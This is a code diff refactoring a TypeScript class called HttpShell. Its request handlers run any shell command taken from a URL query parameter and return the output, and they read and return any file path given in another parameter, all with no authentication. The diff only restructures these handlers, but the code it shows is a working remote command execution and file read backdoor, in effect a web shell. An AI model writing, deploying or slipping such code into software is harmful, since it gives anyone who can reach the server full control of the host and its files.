@@ -49,37 +49,33 @@ const HttpShell = class {
 	};
 
 	static readonly #info: Controller = (_, res) => {
-		res.writeHead(200, this.#getContentType("plain"));
-		res.write(`${platform} ${arch}`);
+		res.writeHead(200, this.#getContentType("plain")).write(`${platform} ${arch}`);
 		return res.end();
 	};
 
 	static readonly #shHandler: Controller = async (req, res) => {
-		const query = this.#extractQueryParams<{ command: string }>(req.url as string);
-		if (query.command === undefined) return res.writeHead(400).end();
+		const { command } = this.#extractQueryParams<{ command: string }>(req.url as string);
+		if (command === undefined) return res.writeHead(400).end();
 		try {
-			const { stderr, stdout } = await promisify(exec)(query.command);
-			if (stderr.length !== 0) throw new Error(stderr);
-			res.writeHead(200, this.#getContentType("plain")).write(stdout);
-			return res.end();
+			const { stderr, stdout } = await promisify(exec)(command);
+			res.writeHead(200, this.#getContentType("plain")).write(`${stdout} \n\n${stderr}`);
 		} catch (error) {
 			res.writeHead(400, this.#getContentType("json")).write(JSON.stringify(error));
-			return res.end();
 		}
+		return res.end();
 	};
 
 	static readonly #fileHandler: Controller = async (req, res) => {
-		const query = this.#extractQueryParams<{ name: string }>(req.url as string);
-		if (query.name === undefined) return res.writeHead(400).end();
+		const { name } = this.#extractQueryParams<{ name: string }>(req.url as string);
+		if (name === undefined) return res.writeHead(400).end();
 		try {
-			const contentType = this.#getContentType(extname(query.name));
-			res.writeHead(200, contentType).write(await readFile(query.name));
-			return res.end();
+			const contentType = this.#getContentType(extname(name));
+			res.writeHead(200, contentType).write(await readFile(name));
 		} catch (error) {
 			console.trace(error);
 			res.writeHead(400).write(error);
-			return res.end();
 		}
+		return res.end();
 	};
 
 	static readonly #extractQueryParams = <T extends object>(endpoint: string): T => {
